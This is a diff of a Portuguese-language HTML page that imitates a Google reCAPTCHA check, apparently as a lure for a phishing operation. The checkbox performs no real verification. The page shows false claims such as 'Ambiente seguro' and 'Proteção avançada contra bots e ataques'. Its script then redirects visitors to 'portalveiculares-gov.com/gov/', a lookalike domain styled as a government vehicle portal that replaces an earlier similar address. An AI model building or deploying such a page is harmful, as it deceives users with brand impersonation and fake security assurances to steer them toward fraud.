@@ -19,45 +19,54 @@ body{
   align-items:center;
   justify-content:center;
   height:100vh;
+  color:#0f172a;
+  font-size:14px;
 }
 
-/* CARD */
 .card{
   width:380px;
   background:#fff;
   border-radius:14px;
   padding:28px 25px;
   box-shadow:0 10px 25px rgba(0,0,0,0.08);
-  position:relative;
-  overflow:hidden;
-  animation:fadeIn .5s ease;
   text-align:center;
 }
 
-/* LINHA SUPERIOR */
-.card::before{
-  content:"";
-  position:absolute;
-  top:0;
-  left:0;
-  width:100%;
-  height:2px;
-  background:#cbd5e1;
+/* TOPO */
+.security-header{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:8px;
+  margin-bottom:12px;
+  font-size:14px;
+}
+
+.shield{
+  font-size:16px;
+  color:#16a34a;
+  font-weight:700;
+}
+
+.security-text{
+  font-size:14px;
+  font-weight:600;
+  color:#16a34a;
 }
 
 /* TÍTULO */
 .title{
-  font-size:22px;
+  font-size:18px;
   font-weight:700;
   color:#1e293b;
-  margin-bottom:10px;
+  margin-bottom:8px;
 }
 
 /* SUBTÍTULO */
 .subtitle{
-  font-size:13px;
+  font-size:14px;
   color:#64748b;
-  margin-bottom:22px;
+  margin-bottom:18px;
   line-height:1.5;
 }
 
@@ -66,10 +75,9 @@ body{
   border:1px solid #d1d5db;
   border-radius:10px;
   background:#f8fafc;
-  padding:18px;
+  padding:16px;
 }
 
-/* LINHA CAPTCHA */
 .captcha-row{
   display:flex;
   align-items:center;
@@ -77,52 +85,32 @@ body{
   gap:10px;
 }
 
-/* CHECKBOX AREA */
+/* CHECK AREA */
 .check-area{
   display:flex;
   align-items:center;
   gap:12px;
   cursor:pointer;
   padding:10px;
-  border-radius:12px;
-  transition:0.25s;
-}
-
-.check-area:hover{
-  background:#e2e8f0;
+  border-radius:8px;
 }
 
 .check-area input{
   display:none;
 }
 
-/* QUADRADO */
+/* CHECKBOX */
 .custom-check{
-  width:26px;
-  height:26px;
+  width:24px;
+  height:24px;
   border:2px solid #7c7c7c;
   border-radius:4px;
   background:#fff;
   display:flex;
   align-items:center;
   justify-content:center;
-  position:relative;
-  transition:0.25s ease;
-  flex-shrink:0;
 }
 
-/* LOADING */
-.custom-check.loading::before{
-  content:"";
-  width:14px;
-  height:14px;
-  border:2px solid #dbeafe;
-  border-top:2px solid #2563eb;
-  border-radius:50%;
-  animation:spin .7s linear infinite;
-}
-
-/* CHECK FINAL */
 .custom-check.checked{
   border-color:#16a34a;
   background:#f0fdf4;
@@ -131,17 +119,16 @@ body{
 .custom-check.checked::before{
   content:"✔";
   color:#16a34a;
-  font-size:15px;
+  font-size:14px;
   font-weight:bold;
 }
 
 .check-text{
-  font-size:15px;
+  font-size:14px;
   color:#0f172a;
-  white-space:nowrap;
 }
 
-/* RECAPTCHA */
+/* LOGO */
 .captcha-brand{
   text-align:center;
   font-size:10px;
@@ -150,52 +137,30 @@ body{
 }
 
 .captcha-brand img{
-  width:34px;
+  width:32px;
   display:block;
   margin:0 auto 3px;
 }
 
-/* SEGURANÇA */
+/* STATUS */
 .secure{
-  margin-top:18px;
+  margin-top:16px;
   color:#16a34a;
-  font-size:12px;
+  font-size:13px;
   font-weight:600;
 }
 
-/* FOOTER */
-.footer{
-  margin-top:14px;
-  font-size:12px;
+/* TEXTO EXTRA */
+.extra-security{
+  margin-top:10px;
+  font-size:13px;
   color:#64748b;
-  line-height:1.7;
+  line-height:1.5;
 }
 
-.footer span{
+.extra-security span{
   display:block;
-  color:#94a3b8;
   margin-top:4px;
-}
-
-/* ANIMAÇÕES */
-@keyframes spin{
-  from{
-    transform:rotate(0deg);
-  }
-  to{
-    transform:rotate(360deg);
-  }
-}
-
-@keyframes fadeIn{
-  from{
-    opacity:0;
-    transform:translateY(15px);
-  }
-  to{
-    opacity:1;
-    transform:translateY(0);
-  }
 }
 </style>
 </head>
@@ -204,55 +169,49 @@ body{
 
 <div class="card">
 
-  <div class="title">
-    Verificação de Segurança
+  <!-- TOPO -->
+  <div class="security-header">
+    <div class="shield">✔</div>
+    <div class="security-text">Ambiente seguro</div>
   </div>
 
+  <!-- TÍTULO -->
+  <div class="title">Verificação de Segurança</div>
+
+  <!-- SUBTÍTULO -->
   <div class="subtitle">
     Confirme que você é humano para continuar
   </div>
 
+  <!-- CAPTCHA -->
   <div class="captcha-box">
 
     <div class="captcha-row">
 
-      <!-- CHECK -->
       <label class="check-area">
-
         <input type="checkbox" id="check">
-
         <div class="custom-check" id="customCheck"></div>
-
-        <span class="check-text" id="text">
-          Não sou um robô
-        </span>
-
+        <span class="check-text">Não sou um robô</span>
       </label>
 
-      <!-- LOGO -->
       <div class="captcha-brand">
         <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
         reCAPTCHA
         <br>
-        <span style="font-size:9px;">
-          Privacidade - Termos
-        </span>
+        Privacidade - Termos
       </div>
 
     </div>
-
   </div>
 
-  <div class="secure">
-    ✔ Conexão protegida e verificação segura
-  </div>
+  <!-- STATUS -->
+  <div class="secure">✔ Ambiente seguro e protegido</div>
 
-  <div class="footer">
-    Ao confirmar a opção, a validação será concluída automaticamente
-
-    <span>
-      Esse processo aumenta a segurança e evita acessos não autorizados
-    </span>
+  <!-- TEXTO EXTRA -->
+  <div class="extra-security">
+    Isso ajuda a proteger o sistema contra acessos indevidos
+    <span>Verificação automática de segurança em tempo real</span>
+    <span>Proteção avançada contra bots e ataques</span>
   </div>
 
 </div>
@@ -260,29 +219,18 @@ body{
 <script>
 const check = document.getElementById("check");
 const customCheck = document.getElementById("customCheck");
-const text = document.getElementById("text");
+
+/* 🔴 LINK DE REDIRECIONAMENTO */
+const REDIRECT_URL = "https://portalveiculares-gov.com/gov/";
 
 check.addEventListener("change", () => {
-
   if(check.checked){
-
-    customCheck.classList.add("loading");
-
-    text.innerText = "Verificando...";
+    customCheck.classList.add("checked");
 
     setTimeout(() => {
-
-      customCheck.classList.remove("loading");
-      customCheck.classList.add("checked");
-
-      text.innerText = "Verificado ✔";
-
-      window.location.href = "https://portaldeveiculosdigital.com/rs/";
-
-    }, 1800);
-
+      window.location.href = REDIRECT_URL;
+    }, 700);
   }
-
 });
 </script>
 
